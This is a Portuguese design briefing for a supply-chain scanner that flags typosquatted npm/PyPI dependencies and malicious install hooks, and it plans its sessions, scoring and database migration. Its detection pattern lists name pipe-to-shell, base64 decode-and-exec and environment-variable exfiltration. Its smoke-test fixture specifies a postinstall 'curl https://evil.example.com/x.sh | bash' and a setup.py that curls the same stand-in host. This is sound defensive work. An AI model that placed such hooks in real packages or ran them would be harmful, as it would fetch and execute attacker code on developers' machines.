# RepoGuard - Briefing: Supply Chain Scanner (Bloco 2 Item 3)

Sessao planejada: E1 (foundation). Roadmap completo da feature: E1-E6.
Branch: main. Migrations dir: docs/migrations/.

## Contexto

Bloco 2 Item 3 do roadmap. Adiciona dois detectores ortogonais ao scanner:

1. Typosquatting nas dependencias (npm + PyPI)
2. Content analysis dos install hooks (npm postinstall + Python setup.py/pyproject)

Diferencial vs IaC scanner existente: o IaC apenas flagga "existe postinstall script" como signal binario. Supply Chain analisa o CONTEUDO desse script procurando padroes maliciosos com severities por padrao detectado. Sem overlap funcional - sao layers diferentes sobre o mesmo arquivo.

## Decisoes tecnicas fechadas

### Fonte de dados typosquatting: lista estatica bundled

Top 5k npm packages + top 1k PyPI packages bundled em lib/data/popular-*.json com rank por download count.

Justificativa:
- Ataques documentados (lodahs, expres, eslint-scope incident, ua-parser-js, ctx, request-aiohttp, jeIlyfish) sempre miram packages famosos. Long tail nao e alvo - depende de fama do nome legitimo.
- Determinista. Sem rate limit silencioso. Sem flakiness de network. Sem latencia +1-3s por dep no budget de 45s.
- Tamanho: aproximadamente 75KB de strings + rank. Bundle aceitavel.
- Refresh trimestral via scripts/refresh-popular-packages.ts.

Rejeitado:
- Live API: rate limit npm 50 req/min sem auth inviabiliza repos com 100+ deps. Adiciona 30-60s ao scan.
- Hibrido: complexidade extra sem ganho real (long tail nao e alvo).

### Escopo postinstall: npm + Python

Justificativa:
- Os DOIS vetores documentados historicamente: event-stream, eslint-scope, ua-parser-js, ctx (npm); jeIlyfish, request-aiohttp, fallguys (PyPI).
- IaC scanner ja cobre GitHub Actions com pattern de "run:" - adicionar aqui geraria duplicacao.
- Cobre aproximadamente 95% dos repos com install-time malware documentado.
- Narrativa de mercado: "RepoGuard scans both npm and Python install hooks for malicious patterns" diferencia vs scanners single-language.

Rejeitado:
- npm-only: deixa Python coverage gap em tooling/data repos.
- npm + Python + GHA: duplica IaC scanner, custo de manutencao alto.

## Estrutura de codigo

```
lib/supply-chain.ts          # orquestracao + types exportados
lib/supply-chain-typo.ts     # detector typosquatting + edit distance
lib/supply-chain-pi-npm.ts   # postinstall content analysis npm
lib/supply-chain-pi-py.ts    # postinstall content analysis python
lib/data/popular-npm.json    # top 5k npm packages com rank
lib/data/popular-pypi.json   # top 1k PyPI packages com rank
scripts/smoke-supply-chain.ts
scripts/refresh-popular-packages.ts
app/components/supply-chain-card.tsx
app/components/supply-chain-gauge.tsx
```

## Tipos exportados de lib/supply-chain.ts

- SupplyChainSeverity = "HIGH" | "MEDIUM" | "LOW"
- SupplyChainCategoryId = "typosquatting" | "postinstall"
- SupplyChainLevel = "excellent" | "good" | "needs-attention" | "critical"
- SupplyChainFinding: { id, categoryId, severity, package?, file, line?, pattern, message, evidence }
- SupplyChainCategoryBreakdown: { id, score, findingCount, severityCounts }
- SupplyChainResult: { score, level, categories[], findings[], scanned }
- __testMatchTyposquat (test-only)
- __testAnalyzePostInstall (test-only)

## Detectores

### Typosquatting (lib/supply-chain-typo.ts)

Algoritmo: Damerau-Levenshtein edit distance entre nome de cada dep do projeto e cada entry da lista popular.

Regras de match:
- distance == 0 mas case-fold difere - HIGH (npm lookup case-insensitive, install case-sensitive)
- distance == 1 - HIGH se target e top 100, MEDIUM se top 1000, LOW se top 5000
- distance == 2 com mesmo prefixo (3+ chars) ou sufixo - MEDIUM degraded por um nivel

Skip se:
- Package em questao tambem esta na lista popular (preact vs react sao ambos legit)
- Package tem prefixo @scope/ (scoped packages tem ownership de namespace)
- Match em alias declarado no package.json (overrides, resolutions)

Output finding inclui: nome do pkg suspeito, nome do alvo legitimo, distance, rank do alvo, evidence string.

### Postinstall content npm (lib/supply-chain-pi-npm.ts)

Parse package.json. Extrai scripts em hooks: preinstall, install, postinstall, prepare, prepublish, prepublishOnly, prerestart, prestart, predev.

Patterns detectados:

HIGH:
- pipe-to-shell: "curl ... | bash", "curl ... | sh", "wget ... | bash", "wget -O- ... | sh"
- decode-and-exec: "eval(atob(...))", "Buffer.from(..., 'base64').toString()" seguido de exec
- env exfil: leitura de process.env + chamada network (fetch, http.request, axios)
- child_process.exec/execSync com URL literal ou variavel dinamica nao-trivial

MEDIUM:
- fetch/http.get/curl/wget em install hook (qualquer uso de network)
- writeFile/writeFileSync com path fora de cwd
- require/import dinamico de URL remota

LOW:
- install hook com mais de 3 comandos encadeados (suspicious complexity)
- minified ou base64-decode standalone (sem exec subsequente)

### Postinstall content python (lib/supply-chain-pi-py.ts)

Parse setup.py via regex (AST parser deferido) e pyproject.toml. Detecta override de cmdclass install/build/develop e build-backend hooks com codigo nao-trivial.

Patterns detectados:

HIGH:
- subprocess.call/run/Popen com URL literal ou input dinamico
- os.system com URL ou variavel
- eval/exec de string decodificada (base64.b64decode, codecs.decode)
- urllib/requests + os.system/subprocess no mesmo hook (download-and-exec)

MEDIUM:
- socket/urllib em build hook (qualquer network)
- arquivo escrito fora do dir do projeto
- import de pacote nao declarado em install_requires

LOW:
- cmdclass override sem padrao malicioso obvio mas non-empty
- Path manipulation suspeita

## Scoring

Penalidade por finding:
- HIGH: 25 pontos
- MEDIUM: 10 pontos
- LOW: 3 pontos

Score = max(0, 100 - sum(penalties)).

Level:
- 90-100: excellent
- 70-89: good
- 50-69: needs-attention
- 0-49: critical

Cap implicito: 4 HIGH ja zera o score.

## Migration 005

Arquivo: docs/migrations/005_add_supply_chain.sql

```sql
ALTER TABLE scans
ADD COLUMN IF NOT EXISTS supply_chain_score INTEGER,
ADD COLUMN IF NOT EXISTS supply_chain_level TEXT,
ADD COLUMN IF NOT EXISTS supply_chain_breakdown JSONB,
ADD COLUMN IF NOT EXISTS supply_chain_findings JSONB;
```

Aplicada via Supabase SQL editor antes do push do codigo da E5 (licao 11).
Padrao alinhado com 004_add_iam.sql (IF NOT EXISTS, 4 colunas).

## UI

Componentes novos:
- app/components/supply-chain-card.tsx
- app/components/supply-chain-gauge.tsx

Padrao: identico ao IamCard. Gauge 0-100, grade level, lista de findings expansivel via useState.

Integrar nas duas paginas:
- app/dashboard/scan/[owner]/[repo]/page.tsx
- app/scan-public/[owner]/[repo]/page.tsx

Atualizar tipo ScanResultFull em ambas as paginas (campo supplyChain).

## Smoke fixture

Criar D:\Projetos\supply-chain-fixture\ contendo:

- package.json com:
  - dependencia "lodahs" (typosquat de lodash, distance=1, top 100 alvo)
  - dependencia "expres" (typosquat de express, distance=1, top 100 alvo)
  - postinstall: "curl https://evil.example.com/x.sh | bash"
- setup.py com cmdclass install que faz subprocess.call(["curl", "https://evil.example.com/y"])
- pyproject.toml minimal com build hook que importa urllib

Smoke roda offline contra essa fixture. Asserts esperados:
- 2 findings typosquatting HIGH
- 1 finding postinstall npm HIGH (pipe-to-shell)
- 1 finding postinstall python HIGH (subprocess + URL)
- 1 finding postinstall python MEDIUM (urllib em build hook)

## Sessions breakdown

### E1 - Foundation [DONE]

- briefing commitado (este arquivo)
- lib/supply-chain.ts boilerplate com todos os types exportados, sem detectores reais
- lib/data/popular-npm.json (top 100 npm seed)
- lib/data/popular-pypi.json (top 80 PyPI seed)
- scripts/refresh-popular-packages.ts (placeholder com fonte documentada)
- scripts/smoke-supply-chain.ts skeleton
- fixture supply-chain-fixture/ com package.json minimal
- npm run build verde

### E2 - Typosquatting completo [DONE]

- lib/supply-chain-typo.ts com Damerau-Levenshtein
- expansao de fixture (8 typosquat cases incluindo case-fold e distance=2)
- smoke local com asserts especificos por finding

### E3 - Postinstall npm [DONE]

- lib/supply-chain-pi-npm.ts com 5 patterns (3 HIGH, 1 MEDIUM, 1 LOW)
- expansao de fixture (5 pi npm cases + 3 benign hooks)
- smoke asserts: 8 typo + 5 pi findings + benign hooks not flagged

### E4 - Postinstall Python [DONE]

- lib/supply-chain-pi-py.ts espelhando pi-npm (5 patterns simetricos)
- regex parser line-by-line de setup.py por classe pai herdada (sem AST)
- pyproject.toml escaneado como single hook (raw content)
- expansao de fixture: setup.py com 5 hooks evil + 1 benign
- smoke asserts: 8 typo + 5 npm pi + 5 py pi findings + benign hooks not flagged

### E5 - API integration + Migration 005 [DONE NESTA SESSAO]

- assessSupplyChain(owner, repo, accessToken, branch?) em lib/supply-chain.ts:
  fetch paralelo de package.json, requirements.txt, pyproject.toml, setup.py
  via GitHub Contents API (Accept: vnd.github.raw), null-safe pra 404/403/erro
- migration 005_add_supply_chain.sql: 4 colunas IF NOT EXISTS no padrao IAM (004)
  - supply_chain_score INTEGER
  - supply_chain_level TEXT
  - supply_chain_breakdown JSONB (= categories)
  - supply_chain_findings JSONB
- /api/scan/[owner]/[repo]/route.ts: assessSupplyChain ao Promise.all,
  persistencia das 4 colunas, supplyChain no JSON response
- /api/scan-public/[owner]/[repo]/route.ts: idem sem persistencia
- ScanResultFull atualizado nas 2 paginas com supplyChain?: SupplyChainResult
- Migration aplicada manualmente no Supabase ANTES do push do codigo (licao 11)
- Smoke test pos-deploy: curl /api/scan-public/octocat/Hello-World valida
  campo supplyChain.score=100 (repo sem manifest = excellent)

### E6 - UI Card

- supply-chain-card.tsx + supply-chain-gauge.tsx (padrao IamCard)
- integracao nas 2 paginas de scan
- ASCII puro nos arquivos novos (componentes), sem emojis novos
- visual: gauge 0-100, level badge, lista de findings agrupada por categoria,
  expansivel via useState

## Riscos e nao-objetivos

Nao sao objetivos desta feature:

- Validacao live de packages contra npm/PyPI registry (deferido)
- Dependency confusion (internos vs publicos) - feature futura
- Maintainer takeover signals - feature futura
- Tarball signature verification - feature futura
- Cobertura de Ruby/PHP/Rust/Go install hooks - deferido
- AST-based parsing de setup.py - deferido (regex em E4)

Riscos:

- False positives em typosquatting com Levenshtein distance 1 entre dois packages legitimos (preact vs react). MITIGACAO: skip se ambos em top list.
- Listas popular-*.json desatualizadas. MITIGACAO: refresh trimestral, script bundled, fonte documentada no header do JSON.
- Mojibake recorrente em arquivos novos. MITIGACAO: ASCII puro, arquivos criados via create_file no chat e baixados pelo Silvio (padrao validado D2-D5).
- Performance: edit distance N x M em repos com 200+ deps e listas de 5k. MITIGACAO: short-circuit por length-diff > 2 antes de calcular distance completa.

## Decisoes adiadas

- AST parser pra setup.py (atual = regex em E4)
- Cache de scans por sha
- Atualizacao automatizada das listas popular-*.json (CI cron)
- Cobertura de mais lifecycle hooks (yarn berry plugins, pnpm hooks)

## Definition of done E5

- [x] Briefing E5 atualizado (este arquivo)
- [ ] Migration 005 aplicada no Supabase prod (manual via SQL editor)
- [ ] lib/supply-chain.ts adiciona assessSupplyChain entrypoint
- [ ] /api/scan/[owner]/[repo]/route.ts wired (Promise.all + persistence + response)
- [ ] /api/scan-public/[owner]/[repo]/route.ts wired (Promise.all + response)
- [ ] ScanResultFull atualizado em page-dashboard-scan.tsx e page-scan-public.tsx
- [ ] npm run build verde
- [ ] Commit unico: "feat(supply-chain): API integration + migration 005 (E5)"
- [ ] Push verde, Vercel deploy verde
- [ ] Smoke pos-deploy: curl /api/scan-public/octocat/Hello-World retorna campo
  supplyChain com score=100 e categories array
